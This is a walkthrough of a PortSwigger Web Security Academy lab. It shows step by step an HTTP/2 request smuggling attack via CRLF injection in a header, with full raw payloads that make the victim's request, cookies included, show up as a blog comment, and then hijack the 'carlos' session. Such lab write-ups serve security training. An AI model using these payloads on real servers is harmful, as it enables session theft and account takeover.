
# HTTP/2 request smuggling via CRLF injection

This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests and fails to adequately sanitize incoming headers.

To solve the lab, use an HTTP/2-exclusive request smuggling vector to gain access to another user's account. The victim accesses the home page every 15 seconds.

If you're not familiar with Burp's exclusive features for HTTP/2 testing, please refer to the documentation for details on how to use them.

Hint: To inject newlines into HTTP/2 headers, use the Inspector to drill down into the header, then press the Shift + Return keys. Note that this feature is not available when you double-click on the header.

Hint: We covered some ways you can capture other users' requests via request smuggling in a previous lab.

---------------------------------------------

References: 

- https://portswigger.net/web-security/request-smuggling/advanced



![img](images/HTTP2%20request%20smuggling%20via%20CRLF%20injection/1.png)

---------------------------------------------


There is a function to send comments:



![img](images/HTTP2%20request%20smuggling%20via%20CRLF%20injection/2.png)


It generates a POST request:



![img](images/HTTP2%20request%20smuggling%20via%20CRLF%20injection/3.png)


To test the H2.TE payload like this one:

```
POST / HTTP/2
...
Fo: ba\r\nTransfer-Encoding: chunked
Content-Type: application/x-www-form-urlencoded
Content-Length: 112

0

GET /404 HTTP/1.1
Host: 0a17003f0315a26781520cb5003200e0.web-security-academy.net
Content-Length: 10

a
```


We must add a new header and add \r\n and the “Transfer-Encoding: chunked” header inside its value, in the Inspector, with the keys “Shift+Return” (Mayús+Enter):



![img](images/HTTP2%20request%20smuggling%20via%20CRLF%20injection/4.png)


Every 2 requests, one is to /404:



![img](images/HTTP2%20request%20smuggling%20via%20CRLF%20injection/5.png)


We will change the request to “/404” for a payload to post a comment:

```
POST / HTTP/2
...
Fo: ba\r\nTransfer-Encoding: chunked
Content-Type: application/x-www-form-urlencoded
Content-Length: 112

0

POST /post/comment HTTP/1.1
Host: 0a17003f0315a26781520cb5003200e0.web-security-academy.net
Cookie: session=BEv90Mt3fW0Ua3AiXdnRALcLTbcb1cfg; _lab_analytics=W8jIeMIzkpt2G9gyOcEFT7MFiZ9uNAOOZ88XEIvVkMgtrQsLrERyvJzQWYeBc1PbyatXyOMh1ZeLQyaqanxeybVTjzHVgx9YB99tmlK2eAkoQgvyLpNdoA3RE1zMyYP90bUEpeuwHcz8h0Fqcg8FLqvmVUbp1BAOCpmqjZ5jPJIVyleFT7Hye1PWojmaKKbY4pRRrF6d8yWPs1k4dP1aCt6d6UcTgLvoKp4Ji6amjKEGvwTm4s0cR8zPbWSmFnf0
Content-Length: 100

csrf=NO7t8vaJHMNuLmScMM45gMnp6NskWAQg&postId=9&name=test2&email=test3@test.com&website=http://test4.com&comment=
```



![img](images/HTTP2%20request%20smuggling%20via%20CRLF%20injection/6.png)


We see the request is written as a comment in the post:



![img](images/HTTP2%20request%20smuggling%20via%20CRLF%20injection/7.png)


The final payload is:

```
POST / HTTP/2
...
Fo: ba\r\nTransfer-Encoding: chunked
Content-Type: application/x-www-form-urlencoded
Content-Length: 112

0

POST /post/comment HTTP/1.1
Host: 0a17003f0315a26781520cb5003200e0.web-security-academy.net
Cookie: session=BEv90Mt3fW0Ua3AiXdnRALcLTbcb1cfg; _lab_analytics=W8jIeMIzkpt2G9gyOcEFT7MFiZ9uNAOOZ88XEIvVkMgtrQsLrERyvJzQWYeBc1PbyatXyOMh1ZeLQyaqanxeybVTjzHVgx9YB99tmlK2eAkoQgvyLpNdoA3RE1zMyYP90bUEpeuwHcz8h0Fqcg8FLqvmVUbp1BAOCpmqjZ5jPJIVyleFT7Hye1PWojmaKKbY4pRRrF6d8yWPs1k4dP1aCt6d6UcTgLvoKp4Ji6amjKEGvwTm4s0cR8zPbWSmFnf0
Content-Length: 200

csrf=NO7t8vaJHMNuLmScMM45gMnp6NskWAQg&postId=9&name=test2&email=test3@test.com&website=http://test4.com&comment=
```

You can read the whole cookies in the comments:



![img](images/HTTP2%20request%20smuggling%20via%20CRLF%20injection/8.png)


And use the cookie to accecss the page as “carlos”:



![img](images/HTTP2%20request%20smuggling%20via%20CRLF%20injection/9.png)

